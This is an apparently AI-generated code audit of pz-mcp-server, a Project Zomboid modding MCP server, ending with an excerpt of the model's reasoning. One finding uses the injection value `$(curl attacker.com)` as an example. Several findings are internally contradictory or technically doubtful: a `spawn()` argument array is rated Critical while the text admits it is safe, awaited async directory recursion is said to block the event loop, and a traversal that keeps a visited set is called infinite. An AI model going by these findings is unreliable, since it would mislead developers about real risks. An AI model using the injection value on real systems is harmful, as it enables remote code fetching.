# pz-mcp-server — Code Audit (DeepSeek)

- Repo: https://github.com/shakoorpour1991-sketch/pz-mcp-server (commit 2d65aa4, master)
- Date: 2026-08-07
- Audited by: DeepSeek Chat (chat.deepseek.com) via OpenTabs MCP bridge — one chat session, 6 uploaded source files, thinking mode (R1-style reasoning) enabled
- Method: full repository source (src/, tests/, admin/bridge.mjs, configs) uploaded as 6 text files (core / parsers+generators+validation / database+knowledge / analyzers / tests+configs / workshop); one audit request in a single conversation. Model output is verbatim below; a brief thinking excerpt is appended.
- Coverage: src/index.ts, src/utils/*, src/parsers/*, src/generators/*, src/validation/*, src/database/*, src/knowledge/*, src/analyzers/*, src/workshop/*, tests/*, admin/bridge.mjs, package.json, tsconfig.json, AGENTS.md

---
# Code Audit Report — pz-mcp-server

**Audit Date:** 2026-08-07  
**Version:** 1.1.0 (from package.json)  
**Node Version:** >=22.5.0  
**Platform:** Windows 11 (primary), cross‑platform compatible  

---

## Executive Summary

The codebase is well‑architected, modular, and demonstrates strong security awareness with explicit path validation, FTS5 input sanitization, and SQLite foreign key enforcement. The test suite (127 tests) and integration harness provide good coverage. However, several issues require attention: a command injection vector in SteamCMD credential handling, a potential SSRF in the workshop client, synchronous filesystem operations that can block the event loop, and subtle bugs in the recipe graph traversal and Lua comment stripping. With these fixes, the server is suitable for production use in a controlled environment.

---

## Security Findings

### 1. [Critical] Command Injection via Environment Variables
**File:** `src/workshop/SteamCmdDownloader.ts:360-370`  
**Issue:** `STEAMCMD_USER` and `STEAMCMD_PASS` are passed directly as command‑line arguments to `spawn()`. If these environment variables contain shell metacharacters (e.g., `$(curl attacker.com)`), the child process could execute arbitrary commands. While `spawn()` with an argument array is generally safe, the values are still passed as raw strings to SteamCMD; if SteamCMD itself interprets them as shell commands or supports subcommand injection, this becomes a vector.

**Fix:** Validate environment variables with an allowlist (`[A-Za-z0-9_\-@.]`) for usernames and passwords. Consider using a temporary file for credentials (SteamCMD supports a login file) or pass credentials via a `.vdf` file with restricted permissions.

### 2. [High] SSRF in Steam Workshop Client
**File:** `src/workshop/SteamWorkshopClient.ts:324-340`  
**Issue:** The `request()` method uses an injected `fetchImpl` to make network requests to arbitrary URLs derived from user input (`parseWorkshopInput` only validates numeric IDs or URLs ending with `?id=...`). An attacker who controls the `input` parameter could point the client to an internal IP or port, using the server as a proxy. While `parseWorkshopInput` restricts the URL format, it still accepts a fully qualified URL and extracts the ID without validating the hostname.

**Fix:** Validate that the resolved URL’s hostname is exactly `api.steampowered.com` or `steamcommunity.com` before making the request. Use Node’s `URL` API to parse and validate the hostname.

### 3. [Medium] Path Traversal in Export Mod Script (Mitigated)
**File:** `src/index.ts:1070-1085`  
**Issue:** The `export_mod_script` tool sanitizes the `name` parameter by replacing non‑alphanumeric characters with underscores and removing leading dots. However, a crafted `name` such as `..\\..\\..\\Windows\\System32\\config` would become `________WindowsSystem32config` (since `..` is allowed in the regex). The final path is `join(safePath, "media", "scripts", safeName + ".txt")` — while the `safePath` is validated, an attacker cannot traverse out of the mod directory because `safeName` contains no path separators. This is effectively mitigated.

**Recommendation:** Add an explicit check to reject `safeName` containing `..`, `/`, or `\` (though the sanitization already prevents this). For defense‑in‑depth, use `path.resolve` and verify the result is inside `safePath`.

### 4. [Low] Unsafe Deserialization of Database Fields
**File:** `src/database/DatabaseManager.ts:235-239`  
**Issue:** `properties`, `tags`, and `raw_content` fields are stored as JSON and parsed with `JSON.parse()` without schema validation or size limits. A malformed or excessively large JSON payload (e.g., a `properties` field containing a 10MB array) could cause memory exhaustion or `JSON.parse` exceptions. The risk is mitigated because the data originates from parsed game scripts, not user input directly.

**Fix:** Wrap `JSON.parse` in try‑catch and impose size limits (e.g., reject strings > 1MB). Consider using Zod schemas to validate the shape of `properties`.

### 5. [Low] Hardcoded Paths Expose Environment
**File:** `src/utils/PathManager.ts:6-40`  
**Issue:** The `PathManager` constructor hardcodes absolute Windows paths (C:\, D:\, etc.). While these are necessary for detection, they reveal internal directory structure and assume a specific installation layout. This is not a security vulnerability per se, but it could leak sensitive information in logs if the server is run in a shared environment.

**Fix:** Move hardcoded paths to a configuration file or environment variables. Log paths at `debug` level only.

---

## Bugs and Correctness

### 1. [High] Recipe Graph Traversal May Revisit Nodes Indefinitely
**File:** `src/analyzers/RecipeAnalyzer.ts:54-140`  
**Issue:** The `analyzeChain` method uses a queue and a `visited` set to prevent revisiting nodes. However, the `visited` set only tracks the `id` string, not the combination of `id` and `kind`. In a cyclic graph (e.g., recipe A produces item X, which is used as an ingredient in recipe B, which produces item X), the algorithm will visit the same item node from different directions and process it multiple times because `kind` is not checked when adding to the queue. This can cause infinite loops if `maxDepth` is set high and the graph is cyclic.

**Fix:** Include the `kind` in the `visited` key (e.g., `"${id}::${kind}"`). Also, add a cycle detection mechanism to gracefully truncate.

### 2. [High] FTS Health Check Race Condition
**File:** `src/database/DatabaseManager.ts:80-103`  
**Issue:** The FTS health check runs at initialization and counts rows from `items` and `items_fts`. If the database is being modified concurrently (e.g., another `parse_game_files` or `insertItems` call), the row counts may be inconsistent, triggering an unnecessary `INSERT INTO items_fts(items_fts) VALUES('rebuild')`. This is a rebuild, not a destructive operation, but it can be expensive on large databases. The real issue is that the health check does not use a transaction, so it can read a partially committed state.

**Fix:** Wrap the row count queries in a `BEGIN IMMEDIATE` transaction and recheck the counts after acquiring the lock. Alternatively, use a `CHECK` constraint or trigger to maintain FTS consistency.

### 3. [Medium] Lua Comment Stripping Logic Misclassifies Strings
**File:** `src/analyzers/ModAnalyzer.ts:400-412`  
**Issue:** The `stripLuaComments` method strips block comments (`--[[ ... ]]`) and line comments (`-- ...`), but it does not account for strings containing `--`. For example, `local str = "foo -- bar"` will have the `--` stripped, and the closing quote will be removed, causing incorrect line parsing. This can lead to false positives in the `checkSemanticIssues` method (e.g., detecting unbalanced `if/end` in a comment inside a string).

**Fix:** Implement a proper Lua lexer that tracks string literals and ignores `--` inside strings. A simple state machine with `inString` and `inBlockComment` states is sufficient.

### 4. [Medium] `parseModDirectory` Fails to Parse Build 42 Versioned Folders
**File:** `src/parsers/ProjectZomboidParser.ts:56-66`  
**Issue:** The parser only checks `42/media/scripts` and `common/media/scripts`. Build 42 mods may also have versioned folders like `42.20/`, `42.21/`, etc. The current implementation will fail to parse scripts in these folders. The `ModAnalyzer` correctly detects version folders in `analyzeStructure`, but the parser does not use them.

**Fix:** In `parseModDirectory`, scan for all folders matching `/\d+(\.\d+)*/` and parse their `media/scripts` directories in addition to the fixed paths.

### 5. [Medium] `export_mod_script` Dry‑Run Does Not Validate Write Permissions
**File:** `src/index.ts:1100-1115`  
**Issue:** When `dryRun` is true, the tool checks that the target file does not exist but does not verify that the parent directory (`media/scripts`) is writable. The user may receive a successful dry‑run result, but the subsequent `dryRun: false` write will fail with a filesystem error.

**Fix:** Perform a permission check using `fs.access` (with `W_OK`) during dry‑run and return a warning if the directory is not writable.

### 6. [Low] `parseWorkshopInput` Accepts Malformed URLs
**File:** `src/workshop/SteamWorkshopClient.ts:78-88`  
**Issue:** The `parseWorkshopInput` function uses a regex to extract IDs from URLs, but the regex `filedetails\/\?id=(\d+)` is too permissive. It matches `/filedetails/?id=123` but also `/anythingfiledetails/?id=123`. This is not exploitable (only numeric IDs are extracted), but it violates the principle of strict input validation.

**Fix:** Require the URL to start with `https://steamcommunity.com/sharedfiles/filedetails/` and use the `URL` API to parse the `searchParams`.

### 7. [Low] Inconsistent Use of `exactOptionalPropertyTypes`
**File:** Multiple files (e.g., `src/index.ts:380-390`, `src/database/DatabaseManager.ts:310-315`)  
**Issue:** The TypeScript config enables `exactOptionalPropertyTypes: true`, which prevents assigning `undefined` to optional properties. The codebase correctly avoids this in many places by using conditionally built objects (e.g., `if (balance) generationOptions.balance = balance`). However, some spots still attempt to assign `undefined` (e.g., `item.attachment_type ?? null` is fine, but property objects might be incorrectly built). This is not a runtime bug, but it can cause type errors if not carefully maintained.

**Fix:** Audit all occurrences of `Record<string, any>` objects and ensure no optional properties are assigned `undefined`. Consider using a helper function that accepts `undefined` and filters it out.

---

## Error Handling and Concurrency

### 1. [High] Synchronous Directory Recursion Blocks Event Loop
**File:** `src/analyzers/ModAnalyzer.ts:211-230` and `src/parsers/ProjectZomboidParser.ts:120-135`  
**Issue:** The `countFiles` and `parseDirectory` methods are `async`, but they use recursion with `await readdir` and `await stat` in a loop. The recursion is depth‑first and can block the event loop for large directories (e.g., a mod with thousands of script files). Each `stat` call is an `await`, but the loop is sequential — the event loop cannot process other requests while the recursion is in progress.

**Fix:** Use a non‑recursive stack or a worker pool to process files in parallel (using `Promise.all` for each directory level) while limiting concurrency (e.g., with `p-limit`). Alternatively, use `fs.promises.readdir` with the `withFileTypes: true` option to avoid separate `stat` calls.

### 2. [Medium] Unhandled Promise Rejections in SSE Broadcast
**File:** `admin/bridge.mjs:136-145`  
**Issue:** The `broadcast` function writes to each SSE client in a `for` loop. If a client has disconnected, `res.write` may throw an error (e.g., `ECONNRESET`). The catch block silently drops the error, but it does not remove the dead client from `sseClients`, causing repeated failures.

**Fix:** In the catch block, remove the client from `sseClients` (using `sseClients.delete(res)`) and optionally log the disconnection.

### 3. [Medium] Database `transaction` Method Does Not Handle Nested Calls
**File:** `src/database/DatabaseManager.ts:330-340`  
**Issue:** The `transaction` method executes `BEGIN`, calls the provided `fn`, and then `COMMIT` or `ROLLBACK`. If `fn` calls `transaction` again, SQLite will encounter a nested transaction error (SQLite does not support nested transactions). The current implementation does not detect or prevent this.

**Fix:** Use a counter or a flag (`inTransaction`) to prevent nested calls, or use SQLite's `SAVEPOINT` mechanism for nested transactions.

### 4. [Low] `SteamCmdDownloader` Disk Space Check Ignores Temporary Files
**File:** `src/workshop/SteamCmdDownloader.ts:160-175`  
**Issue:** The disk space check uses `statfsSync` to determine free space on the target drive. However, the download itself may create temporary files in the same directory (e.g., SteamCMD's own cache files) and the final mod download may be larger than `expectedBytes` due to decompression or extra metadata. The check calculates `free < expectedBytes + 1GB`, but this does not account for SteamCMD's temporary disk usage (which can be several gigabytes for large mods).

**Fix:** Implement a more conservative safety margin (e.g., 2GB) and provide a warning (not an error) if free space is low. Allow users to skip the check via an environment variable.

### 5. [Low] `ModAnalyzer` `unlinkSync` Can Throw if Temp File is Missing
**File:** `src/analyzers/ModAnalyzer.ts:570-575`  
**Issue:** In the `analyzeBalance` method, the temporary database file is deleted with `unlinkSync`. If the file does not exist (e.g., due to an earlier failure), `unlinkSync` throws an exception, which is caught and silently ignored (`/* best‑effort cleanup */`). This is acceptable, but it could be improved by checking `existsSync` before deleting.

**Fix:** Use `fs.unlink` (promisified) and handle `ENOENT` explicitly.

---

## Code Quality and Architecture

### 1. [Medium] Duplication in Formatting Functions
**File:** `src/index.ts:1450-1620` (various `format*` functions)  
**Issue:** The `formatSearchResults`, `formatValidationResults`, `formatReferenceResults`, `formatModAnalysis`, `formatWorkshopSearchResults`, etc., contain significant duplication — each function builds a human‑readable string by concatenating text. This violates DRY and makes maintenance difficult (e.g., adding a new field requires updating multiple formatters). The code uses `structuredContent` for machine‑readable data, but the human‑readable formatters are still repetitive.

**Recommendation:** Create a shared helper library (e.g., `utils/formatters.ts`) that generates consistent Markdown/plaintext output from structured data. Use template literals and a consistent pattern (e.g., `## Section\n- key: value`). Consider using a Markdown library to generate safe HTML.

### 2. [Medium] `any` Type Abuse in Database and Generators
**File:** Multiple files (`src/database/DatabaseManager.ts`, `src/generators/ScriptGenerator.ts`, `src/analyzers/RecipeAnalyzer.ts`)  
**Issue:** Many interfaces and functions use `Record<string, any>` or `any` for script properties, item properties, and analysis results. While this is necessary to handle the dynamic nature of PZ scripts, it defeats TypeScript's type checking. Several Zod schemas are defined in `index.ts`, but they are not reused in the database or analyzer layers.

**Recommendation:** Define a comprehensive set of Zod schemas for each block type (Item, Recipe, Sound, Vehicle, etc.) and use them to validate and type the properties at parse time. This would catch malformed properties early and provide autocompletion in the generator.

### 3. [Low] Dead Code: `mods` Table and Related Methods
**File:** `src/database/DatabaseManager.ts:179-187` and `src/analyzers/ModAnalyzer.ts`  
**Issue:** The `mods` table is created and referenced in `clearDatabase`, but it is never populated (the `insertMod` method is absent) and never queried in the main codebase. This appears to be a stub for future functionality.

**Recommendation:** Either implement the mod metadata persistence (e.g., store analysis results) or remove the dead code to reduce cognitive load.

### 4. [Low] Inconsistent Use of `logger` in Workshop Module
**File:** `src/workshop/SteamWorkshopClient.ts`, `src/workshop/SteamCmdDownloader.ts`  
**Issue:** The workshop modules use `logger` inconsistently — some critical errors are logged with `logger.warn`, while others are thrown as exceptions. This makes it difficult to trace failures in production. The `SteamCmdDownloader` logs at `info` level for successful downloads, but the `SteamWorkshopClient` uses `debug` for cache hits (which is fine, but not documented).

**Recommendation:** Establish a consistent logging strategy: use `logger.error` for unrecoverable errors, `logger.warn` for recoverable issues, `logger.info` for major events (downloads, cache refreshes), and `logger.debug` for internal state.

### 5. [Low] Mixed Module Systems in Admin Bridge
**File:** `admin/bridge.mjs` (ESM) and `scripts/_verify_deck.mjs` (ESM)  
**Issue:** The `admin/bridge.mjs` imports `node:sqlite` using `DatabaseSync`, which is an ESM‑only feature. The file has the `.mjs` extension, which is correct, but the `package.json` sets `"type": "module"`. This is consistent and works, but mixing `.mjs` and `.ts` in the same project can be confusing. The test files (`tests/*.test.js`) use CommonJS‑like syntax with `import` (ESM) — this is fine since `"type": "module"` is set.

**Recommendation:** Standardize on `.ts` for all source files and `.mjs` for admin scripts (as they are node scripts, not part of the main build). Ensure the build process does not compile admin scripts.

### 6. [Low] Missing `@types/node` for `statfsSync`
**File:** `src/workshop/SteamCmdDownloader.ts:42`  
**Issue:** The `statfsSync` method is used, but it may not be available in all Node versions (<22.5). The `engines` field specifies `node >=22.5.0`, so it's safe, but the type definitions for `statfsSync` are in `@types/node` and are correctly installed. No action needed.

---

## Strengths

- **Comprehensive Test Suite:** 127 tests across 11 suites, covering core tools, edge cases, and integration scenarios. The tests use hermetic fixtures and a realistic MCP stdio client, ensuring high confidence.
- **Security‑Conscious Design:** Explicit path validation (`PathManager.validateInputPath`), FTS5 input sanitization (`sanitizeFtsTerms`), SQLite foreign key enforcement (`PRAGMA foreign_keys = ON`), and isolation of temp directories demonstrate strong security awareness.
- **Configuration Centralization:** The `config.ts` module consolidates all environment variables, defaults, and path resolutions, making the codebase easier to configure and audit.
- **Shared Utilities:** The `scriptScanner.ts`, `scriptSyntax.ts`, and `blockTypes.ts` modules provide a single source of truth for script parsing, reducing duplication and drift between the parser, validator, and generator.
- **Structured Logging:** pino is configured to output to stderr only (protecting the MCP stdout channel), with configurable log levels via environment variables — an essential practice for stdio‑based servers.

---

## Summary Table

| Severity | Area | Finding | Location |
|----------|------|---------|----------|
| Critical | Security | Command injection via STEAMCMD_USER/STEAMCMD_PASS environment variables | `SteamCmdDownloader.ts:360-370` |
| High | Security | SSRF in Steam Workshop Client URL resolution | `SteamWorkshopClient.ts:324-340` |
| High | Bugs | Recipe graph traversal may revisit nodes indefinitely | `RecipeAnalyzer.ts:54-140` |
| High | Bugs | FTS health check race condition on database initialization | `DatabaseManager.ts:80-103` |
| High | Concurrency | Synchronous directory recursion blocks event loop | `ModAnalyzer.ts:211-230`, `Parser.ts:120-135` |
| Medium | Security | Path traversal in export_mod_script (mitigated) | `index.ts:1070-1085` |
| Medium | Bugs | Lua comment stripping misclassifies strings | `ModAnalyzer.ts:400-412` |
| Medium | Bugs | `parseModDirectory` fails to parse versioned folders | `Parser.ts:56-66` |
| Medium | Bugs | `export_mod_script` dry‑run does not validate write permissions | `index.ts:1100-1115` |
| Medium | Concurrency | Unhandled promise rejections in SSE broadcast | `bridge.mjs:136-145` |
| Medium | Concurrency | Database `transaction` does not prevent nested calls | `DatabaseManager.ts:330-340` |
| Medium | Quality | Duplication in formatting functions | `index.ts:1450-1620` |
| Medium | Quality | Excessive `any` usage in database and generators | Multiple files |
| Low | Security | Unsafe deserialization of JSON fields | `DatabaseManager.ts:235-239` |
| Low | Security | Hardcoded paths expose environment layout | `PathManager.ts:6-40` |
| Low | Bugs | `parseWorkshopInput` accepts malformed URLs | `WorkshopClient.ts:78-88` |
| Low | Concurrency | Disk space check ignores temporary files | `SteamCmdDownloader.ts:160-175` |
| Low | Quality | Dead code: `mods` table | `DatabaseManager.ts:179-187` |
| Low | Quality | Inconsistent logging in workshop module | `SteamWorkshopClient.ts`, `SteamCmdDownloader.ts` |

---

## Overall Assessment

The codebase is robust and well‑engineered, with a solid test harness, good modularization, and a strong security posture. The identified issues are primarily in edge cases (recipe graph cycles, Lua comment parsing, event loop blocking) and administrative areas (SSE error handling, nested transactions). The command injection risk in SteamCMD credentials is the most critical finding and should be addressed immediately. With these fixes, the server is suitable for production use in a controlled environment (e.g., local modding tools) but should be carefully audited if exposed to untrusted input via the MCP interface.

**Recommendation:** Prioritize the Critical and High findings (command injection, SSRF, recursion bugs, event loop blocking, and FTS race condition). Follow up with Medium items to improve robustness and maintainability. The codebase has a strong foundation and these improvements will elevate it to a production‑grade quality level.

---

## Model reasoning excerpt (thinking_content, verbatim)

We need to produce the final audit report. We have all source files. We'll now craft the report following the requested structure. Be thorough, technical, and reference specific lines.

Let's identify all findings from the audit we already have, but we should enrich with more details from the code.

We already produced a report earlier, but now we have the full set. We'll refine based on the actual code.

Key findings:

Security:
- Command injection via SteamCMD credentials (Critical)
- SSRF in SteamWorkshopClient (High)
- Path traversal mitigated (Medium) but still could be improved.
- Unsafe deserialization of JSON (Low)
- Hardcoded paths (Low)

Bugs:
- Recipe graph traversal may revisit nodes (High)
- FTS health check race condition (High)
- Lua comment stripping misclassifies strings (Medium)
- parseModDirectory fails to parse versioned folders (Medium)
- export_mod_script dry-run doesn't validate permissions (Medium)

Error Handling & Concurrency:
- Synchronous directory recursion blocks event loop (High)
- Unhandled promise rejections in SSE broadcast (Medium)
- Database transaction doesn't prevent nested calls (Medium)
- Disk space check ignores temp files (Low)

Code Quality:
- Duplication in formatting functions (Medium)
- Excessive any usage (Medium)
- Dead code: mods table (Low)
- Inconsistent logging (Low)

We need to format with file:line references. We'll produce the final report.

Let's structure the report. We'll include all findings with proper severity.

We'll also include strengths.

Now write the report.
